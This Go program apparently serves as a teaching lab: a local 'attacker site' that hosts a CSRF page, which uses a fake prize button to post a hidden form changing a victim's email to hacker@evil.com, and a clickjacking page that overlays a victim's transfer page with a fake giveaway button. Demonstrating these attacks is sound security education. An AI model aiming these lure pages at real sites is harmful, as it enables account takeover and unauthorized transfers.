package main

import (
	"fmt"
	"log"
	"net/http"
)

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", homeHandler)
	mux.HandleFunc("/csrf", csrfHandler)
	mux.HandleFunc("/clickjacking", clickjackingHandler)

	log.Println("Attacker site starting on :8081")
	log.Fatal(http.ListenAndServe(":8081", mux))
}

func homeHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, `
		<h1 style="color:red">Attacker Site</h1>
		<ul>
			<li><a href="/csrf">CSRF Attack Page</a></li>
			<li><a href="/clickjacking">Clickjacking Attack Page</a></li>
		</ul>
		<hr>
		<p><a href="http://localhost:8080">Back to Victim Site</a></p>
	`)
}

func csrfHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<h1 style="color:red">Congratulations! You won a prize!</h1>
		<p>Press the button below to claim your reward!</p>
		<form action="http://localhost:8080/update-email" method="POST">
			<input type="hidden" name="email" value="hacker@evil.com">
			<input type="submit" value="Claim Prize" style="padding:10px 20px; font-size:18px">
		</form>
		<hr>
		<p><a href="/">Back to Attacker Site</a> | <a href="http://localhost:8080">Back to Victim Site</a></p>
	`)
}

func clickjackingHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `
		<style>
			#victim-frame {
				width: 100%%;
				height: 500px;
				position: absolute;
				top: 0;
				left: 0;
				opacity: 0.4; /* Semi-transparent for demo; real attack uses 0.0 */
				z-index: 2;
			}
			#fake-page {
				width: 100%%;
				height: 500px;
				position: absolute;
				top: 0;
				left: 0;
				z-index: 1;
				background: #e0ffe0;
				text-align: center;
				padding-top: 100px;
			}
			.fake-btn {
				margin-top: 105px;
				padding: 25px 50px;
				font-size: 24px;
				background: #44bb44;
				color: white;
				border: none;
				border-radius: 10px;
			}
		</style>
		<div id="fake-page">
			<h1>Free Cookies Giveaway!</h1>
			<p>Press the big button below to get free cookies now!</p>
			<button class="fake-btn">GET COOKIES</button>
		</div>
		<iframe id="victim-frame" src="http://localhost:8080/transfer"></iframe>
	`)
}
